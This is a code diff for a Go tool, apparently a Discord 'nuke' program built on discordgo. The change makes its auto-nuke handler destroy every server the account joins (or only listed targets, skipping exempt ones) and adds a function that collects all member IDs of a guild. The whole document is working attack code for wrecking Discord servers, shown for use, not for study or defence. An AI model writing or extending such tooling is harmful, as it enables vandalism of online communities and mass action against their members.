@@ -2,9 +2,11 @@ package main
 
 import (
 	"fmt"
+	"math/rand"
 	"sync"
 
 	"github.com/bwmarrin/discordgo"
+	"golang.org/x/exp/slices"
 )
 
 func (na NukeAccount) BeginNuke() error {
@@ -13,10 +15,21 @@ func (na NukeAccount) BeginNuke() error {
 		return err
 	}
 
-	if na.Config.FeatureConfig.AutoNuke {
+	if na.Config.FeatureConfig.AutoNukeConfig.Enabled {
 		wg := sync.WaitGroup{}
 		wg.Add(1)
 		na.Session.AddHandler(func(s *discordgo.Session, m *discordgo.GuildCreate) {
+			targets := na.Config.FeatureConfig.AutoNukeConfig.TargetOnly
+			if len(targets) > 0 {
+				if slices.Contains(targets, m.ID) {
+					na.nukeOneGuild(m.ID)
+				}
+				return
+			}
+			exempt := na.Config.FeatureConfig.AutoNukeConfig.ExemptGuilds
+			if slices.Contains(exempt, m.ID) {
+				return
+			}
 			na.nukeOneGuild(m.ID)
 		})
 		fmt.Println("Auto nuke is listening for server-join events")
@@ -79,4 +92,18 @@ func (na NukeAccount) startNukeTasks() {
 		}
 	}
 	wg.Wait()
+}
+
+func (na NukeAccount) getGuildMemberIDs() []string {
+	ids := []string{}
+	collected := make(chan bool)
+	na.Session.AddHandlerOnce(func(s *discordgo.Session, chunk *discordgo.GuildMembersChunk) {
+		for _, member := range chunk.Members {
+			ids = append(ids, member.User.ID)
+		}
+		collected <- true
+	})
+	na.Session.RequestGuildMembers(na.Config.GuildID, "", 0, fmt.Sprint(rand.Intn(10000000)), false)
+	<-collected
+	return ids
 }
